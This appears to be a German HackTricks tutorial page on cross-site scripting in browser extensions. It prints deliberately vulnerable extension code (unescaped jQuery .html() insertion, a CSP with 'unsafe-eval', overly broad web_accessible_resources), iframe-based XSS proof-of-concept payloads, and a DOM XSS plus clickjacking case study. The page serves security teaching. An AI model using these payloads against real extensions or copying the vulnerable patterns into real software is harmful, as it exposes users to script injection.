# BrowExt - XSS Beispiel

{{#include ../../banners/hacktricks-training.md}}

## Cross-Site Scripting (XSS) durch Iframe

In diesem Setup wird ein **Inhalts-Skript** implementiert, um ein Iframe zu instanziieren, das eine URL mit Abfrageparametern als Quelle des Iframes einfügt:
```javascript
chrome.storage.local.get("message", (result) => {
let constructedURL =
chrome.runtime.getURL("message.html") +
"?content=" +
encodeURIComponent(result.message) +
"&redirect=https://example.net/details"
frame.src = constructedURL
})
```
Eine öffentlich zugängliche HTML-Seite, **`message.html`**, ist so gestaltet, dass sie Inhalte dynamisch zum Dokumenteninhalt basierend auf den Parametern in der URL hinzufügt:
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search)
let userContent = urlParams.get("content")
$(document.body).html(
`${userContent} <button id='detailBtn'>Details</button>`
)
$("#detailBtn").on("click", () => {
let destinationURL = urlParams.get("redirect")
chrome.tabs.create({ url: destinationURL })
})
})
```
Ein bösartiges Skript wird auf der Seite eines Angreifers ausgeführt, das den `content`-Parameter der Iframe-Quelle ändert, um eine **XSS-Payload** einzuführen. Dies wird erreicht, indem die Iframe-Quelle aktualisiert wird, um ein schädliches Skript einzuschließen:
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src
let baseURL = targetFrame.split("?")[0]
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>"
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`

document.querySelector("iframe").src = maliciousURL
}, 1000)
```
Eine zu permissive Content Security Policy wie:
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
ermöglicht die Ausführung von JavaScript, wodurch das System anfällig für XSS-Angriffe wird.

Ein alternativer Ansatz, um das XSS auszulösen, besteht darin, ein Iframe-Element zu erstellen und dessen Quelle so einzustellen, dass das schädliche Skript als `content`-Parameter enthalten ist:
```javascript
let newFrame = document.createElement("iframe")
newFrame.src =
"chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>")
document.body.append(newFrame)
```
## DOM-basiertes XSS + ClickJacking

Dieses Beispiel stammt aus dem [originalen Beitrag](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/).

Das Kernproblem ergibt sich aus einer DOM-basierten Cross-site Scripting (XSS) Schwachstelle, die sich in **`/html/bookmarks.html`** befindet. Das problematische JavaScript, Teil von **`bookmarks.js`**, ist unten aufgeführt:
```javascript
$("#btAdd").on("click", function () {
var bookmarkName = $("#txtName").val()
if (
$(".custom-button .label").filter(function () {
return $(this).text() === bookmarkName
}).length
)
return false

var bookmarkItem = $('<div class="custom-button">')
bookmarkItem.html('<span class="label">' + bookmarkName + "</span>")
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>')
bookmarkItem.attr("data-title", bookmarkName)
bookmarkItem.data("timestamp", new Date().getTime())
$("section.bookmark-container .existing-items").append(bookmarkItem)
persistData()
})
```
Dieser Snippet ruft den **Wert** aus dem **`txtName`** Eingabefeld ab und verwendet **String-Konkatenation zur Generierung von HTML**, das dann mit jQuerys `.append()` Funktion an das DOM angehängt wird.

Typischerweise würde die Content Security Policy (CSP) der Chrome-Erweiterung solche Schwachstellen verhindern. Aufgrund der **CSP-Entspannung mit ‘unsafe-eval’** und der Verwendung von jQuerys DOM-Manipulationsmethoden (die [`globalEval()`](https://api.jquery.com/jquery.globaleval/) verwenden, um Skripte an [`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) bei der DOM-Einfügung zu übergeben), ist eine Ausnutzung jedoch weiterhin möglich.

Obwohl diese Schwachstelle erheblich ist, hängt ihre Ausnutzung normalerweise von der Benutzerinteraktion ab: die Seite besuchen, eine XSS-Nutzlast eingeben und die Schaltfläche „Hinzufügen“ aktivieren.

Um diese Schwachstelle zu verstärken, wird eine sekundäre **Clickjacking**-Schwachstelle ausgenutzt. Das Manifest der Chrome-Erweiterung zeigt eine umfangreiche `web_accessible_resources`-Richtlinie:
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
Bemerkenswert ist, dass die **`/html/bookmarks.html`**-Seite anfällig für Framing ist und somit verwundbar für **clickjacking**. Diese Schwachstelle wird ausgenutzt, um die Seite innerhalb der Website eines Angreifers einzurahmen und sie mit DOM-Elementen zu überlagern, um die Benutzeroberfläche täuschend umzugestalten. Diese Manipulation führt dazu, dass die Opfer unbeabsichtigt mit der zugrunde liegenden Erweiterung interagieren.

## References

- [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
- [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

{{#include ../../banners/hacktricks-training.md}}
